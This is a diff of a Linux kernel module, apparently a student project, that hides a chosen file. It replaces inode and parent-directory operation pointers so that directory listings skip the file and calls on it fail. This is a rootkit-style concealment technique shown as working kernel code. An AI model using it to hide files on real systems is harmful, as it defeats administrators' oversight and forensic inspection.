@@ -1,4 +1,3 @@
-
 #include <linux/module.h> // licence
 #include <linux/fs.h>     /* file stuff */
 #include <linux/kernel.h> /* printk() */
@@ -10,36 +9,11 @@
 #include <linux/namei.h>
 #include <linux/version.h>
 #include <linux/list.h>
-// #include <string.h>
+
 #define EMBEDDED_LEVELS 2
 #define SUCCESS 0
 #define DEVICE_NAME "hidefile" ///< The device will appear at /dev/hidefile using this value
 #define CLASS_NAME "hide"      ///< The device class -- this is a character device driver
-struct nameidata
-{
-    struct path path;
-    struct qstr last;
-    struct path root;
-    struct inode *inode; /* path.dentry.d_inode */
-    unsigned int flags;
-    unsigned seq, m_seq, r_seq;
-    int last_type;
-    unsigned depth;
-    int total_link_count;
-    struct saved
-    {
-        struct path link;
-        struct delayed_call done;
-        const char *name;
-        unsigned seq;
-    } * stack, internal[EMBEDDED_LEVELS];
-    struct filename *name;
-    struct nameidata *saved;
-    unsigned root_seq;
-    int dfd;
-    kuid_t dir_uid;
-    umode_t dir_mode;
-};
 
 /*Declare*/
 int register_device(void); /* 0 if Ok*/
@@ -51,7 +25,6 @@ void reallocate_memmory(void);
 unsigned long hook_functions(const char *);
 unsigned long backup_functions(void);
 int parent_readdir(struct file *, void *, filldir_t);
-int new_readdir(struct file *, void *, filldir_t);
 int new_open(struct inode *, struct file *);
 int new_flush(struct file *, fl_owner_t id);
 int new_release(struct inode *, struct file *);
@@ -61,17 +34,10 @@ int new_mmap(struct file *, struct vm_area_struct *);
 ssize_t new_read(struct file *, char __user *, size_t, loff_t *);
 ssize_t new_write(struct file *, const char __user *, size_t, loff_t *);
 static int new_filldir(struct dir_context *, const char *, int, loff_t, u64, unsigned);
-//sua lai
-int parent_iterate(struct file *file, struct dir_context *dir_context);
 int parent_iterate_shared(struct file *file, struct dir_context *dir_context);
-
-// int new_getattr (struct vfsmount *mnt, struct dentry *, struct kstat *);
 int new_getattr(const struct path *, struct kstat *, unsigned int, unsigned int);
-
 int new_rmdir(struct inode *, struct dentry *);
-
 struct dentry *g_parent_dentry;
-struct nameidata g_root_nd;
 struct path g_root_path;
 static struct class *hidefileClass = NULL;   ///< The device-driver class struct pointer
 static struct device *hidefileDevice = NULL; ///< The device-driver device struct pointer
@@ -89,25 +55,14 @@ void **g_old_parent_fop_pointer;
 
 filldir_t real_filldir;
 loff_t realpos;
-static struct dir_context old_dc;
-
-// struct dir_context new_dc=
-// {
-//     .actor = new_filldir,
-//     .pos = realpos,
-// };
 
 /***********************File parent OPERATIONS*****************************/
 static struct file_operations new_parent_fop =
     {
         .owner = THIS_MODULE,
-        // .readdir = parent_readdir,
-        // .iterate = parent_iterate,
         .iterate_shared = parent_iterate_shared,
-        // .iterate_shared = iterate_dir,
 };
 
-// static int new_filldir(void *buf, const char *name, int namelen, loff_t offset, u64 ux64, unsigned ino)
 static int new_filldir(struct dir_context *dc, const char *name, int namelen, loff_t offset, u64 ux64, unsigned ino)
 {
     unsigned int i = 0;
@@ -140,7 +95,6 @@ static int new_filldir(struct dir_context *dc, const char *name, int namelen, lo
     else
         printk(KERN_ALERT "dentry %s not found\n", name);
 
-
     return real_filldir(dc, name, namelen, offset, ux64, ino);
 }
 
@@ -148,60 +102,18 @@ int parent_iterate_shared(struct file *file, struct dir_context *dc)
 {
     g_parent_dentry = file->f_path.dentry;
     real_filldir = dc->actor;
-    // real_filldir = filldir;
     realpos = dc->pos;
-    struct dir_context new_dc;
-    // new_dc.pos = file->f_pos;
-    new_dc.pos = dc->pos;
-    new_dc.actor = dc->actor;
-    struct dir_context ctx;
-    // int t = file->f_path.dentry->d_inode->i_fop->iterate_shared(file, &new_dc);
-    // int t= file->f_op->iterate_shared(file, &new_dc);
-
+    
     dc->actor = new_filldir;
-    int t = g_root_path.dentry->d_inode->i_fop->iterate_shared(file, dc);
-    printk(KERN_ALERT "interating_shared dir of ./%s\n", file->f_path.dentry->d_name.name);
-    return t;
-}
-int parent_iterate(struct file *file, struct dir_context *dir_context)
-{
-    printk(KERN_ALERT "interating dir");
-
-    return -2;
-    g_parent_dentry = file->f_path.dentry;
-    real_filldir = dir_context->actor;
-    realpos = dir_context->pos;
-    struct dir_context new_dc =
-        {
-            .actor = new_filldir,
-            .pos = realpos,
-        };
-    struct dir_context ctx;
-    // return (file->f_dentry->d_sb->s_root->d_inode->i_fop->iterate(file, &new_dc));
-    return file->f_op->iterate(file, &new_dc);
-    // int t = g_root_path.dentry->d_inode->i_fop->iterate(file, &new_dc);
-    // return t;
+    return g_root_path.dentry->d_inode->i_fop->iterate_shared(file, dc);
 }
 
-int parent_readdir(struct file *file, void *dirent, filldir_t filldir)
-{
-    //g_parent_dentry = file->f_dentry;
-    g_parent_dentry = file->f_path.dentry;
 
-    real_filldir = filldir;
-
-    //return g_root_nd.path.dentry->d_inode->i_fop->readdir(file, dirent, new_filldir);
-    //return file->f_dentry->d_sb->s_root->d_inode->i_fop->readdir(file, dirent, new_filldir);
-    return 0;
-}
 /********************************FILE OPERATIONS*************************/
 static struct file_operations new_fop =
     {
         .owner = THIS_MODULE,
-        // .readdir = new_readdir,
         .release = new_release,
-        // .open = new_open,
-        // .read = new_read,
         .write = new_write,
         .mmap = new_mmap,
 };
@@ -236,11 +148,6 @@ int new_flush(struct file *file, fl_owner_t id)
     return -2;
 }
 
-int new_readdir(struct file *file, void *dirent, filldir_t filldir)
-{
-    printk(KERN_ALERT "Entered in new_readdir \n");
-    return -2;
-}
 
 int new_open(struct inode *old_inode, struct file *old_file)
 {
@@ -300,21 +207,16 @@ void reallocate_memmory()
 unsigned long hook_functions(const char *file_path)
 {
     int error = 0;
-    struct nameidata nd;
-    struct path p;
+    struct path ndpath;
 
-    // error = path_lookup("/root", 0, &g_root_nd);
-    //error = vfs_path_lookup(dentry, mnt,name,flag,&path);
     error = kern_path("/root", 1, &g_root_path);
     if (error)
     {
         printk(KERN_ALERT "Can't access root\n");
-
         return -1;
     }
 
-    //error = path_lookup(file_path, 0, &nd);
-    error = kern_path(file_path, 1, &nd.path);
+    error = kern_path(file_path, 1, &ndpath);
 
     if (error)
     {
@@ -338,25 +240,25 @@ unsigned long hook_functions(const char *file_path)
 
     /************************Old pointers**********************************/
     /*Save pointers*/
-    g_old_inode_pointer[g_inode_count] = nd.path.dentry->d_inode;
-    g_old_fop_pointer[g_inode_count] = (void *)nd.path.dentry->d_inode->i_fop;
-    g_old_iop_pointer[g_inode_count] = (void *)nd.path.dentry->d_inode->i_op;
+    g_old_inode_pointer[g_inode_count] = ndpath.dentry->d_inode;
+    g_old_fop_pointer[g_inode_count] = (void *)ndpath.dentry->d_inode->i_fop;
+    g_old_iop_pointer[g_inode_count] = (void *)ndpath.dentry->d_inode->i_op;
 
-    g_old_parent_inode_pointer[g_inode_count] = nd.path.dentry->d_parent->d_inode;
-    g_old_parent_fop_pointer[g_inode_count] = (void *)nd.path.dentry->d_parent->d_inode->i_fop;
+    g_old_parent_inode_pointer[g_inode_count] = ndpath.dentry->d_parent->d_inode;
+    g_old_parent_fop_pointer[g_inode_count] = (void *)ndpath.dentry->d_parent->d_inode->i_fop;
 
     /*Save inode number*/
-    g_inode_numbers[g_inode_count] = nd.path.dentry->d_inode->i_ino;
+    g_inode_numbers[g_inode_count] = ndpath.dentry->d_inode->i_ino;
     g_inode_count = g_inode_count + 1;
 
     reallocate_memmory();
 
     /*filldir hook*/
-    nd.path.dentry->d_parent->d_inode->i_fop = &new_parent_fop;
+    ndpath.dentry->d_parent->d_inode->i_fop = &new_parent_fop;
 
-    /* Hook of commands for file*/
-    nd.path.dentry->d_inode->i_op = &new_iop;
-    nd.path.dentry->d_inode->i_fop = &new_fop;
+    /* Hook of commands file*/
+    ndpath.dentry->d_inode->i_op = &new_iop;
+    ndpath.dentry->d_inode->i_fop = &new_fop;
 
     return 0;
 }
@@ -484,7 +386,7 @@ int register_device(void)
     hidefileClass = class_create(THIS_MODULE, CLASS_NAME);
     if (IS_ERR(hidefileClass))
     { // Check for error and clean up if there is
-        unregister_chrdev(device_file_major_number, DEVICE_NAME);
+        unregister_chrdev(device_file_major_number, device_name);
         printk(KERN_ALERT "Failed to register device class\n");
         return PTR_ERR(hidefileClass); // Correct way to return an error on a pointer
     }
@@ -495,7 +397,7 @@ int register_device(void)
     if (IS_ERR(hidefileDevice))
     {                                 // Clean up if there is an error
         class_destroy(hidefileClass); // Repeated code but the alternative is goto statements
-        unregister_chrdev(device_file_major_number, DEVICE_NAME);
+        unregister_chrdev(device_file_major_number, device_name);
         printk(KERN_ALERT "Failed to create the device\n");
         return PTR_ERR(hidefileDevice);
     }
@@ -531,7 +433,7 @@ void inode_hide_exit(void)
     device_destroy(hidefileClass, MKDEV(device_file_major_number, 0)); // remove the device
     class_unregister(hidefileClass);                                   // unregister the device class
     class_destroy(hidefileClass);                                      // remove the device class
-    unregister_chrdev(device_file_major_number, DEVICE_NAME);
+    unregister_chrdev(device_file_major_number, device_name);
 }
 
 module_init(inode_hide_init);
@@ -539,7 +441,7 @@ module_exit(inode_hide_exit);
 
 //GIAYPHEP
 MODULE_LICENSE("GPL");
-// MODULE_AUTHOR(DRIVER_AUTHOR);
-// MODULE_DESCRIPTION(DRIVER_DESC);
-// MODULE_VERSION(DRIVER_VERSION);
+MODULE_AUTHOR("Cao Kim Nhat - 1612459, Huynh Gia Bao - 18120006, Nguyen Long Nghia - 18120479");
+MODULE_DESCRIPTION("Driver to hide file");
+MODULE_VERSION("1.0");
 MODULE_SUPPORTED_DEVICE("TEST DEVICE");
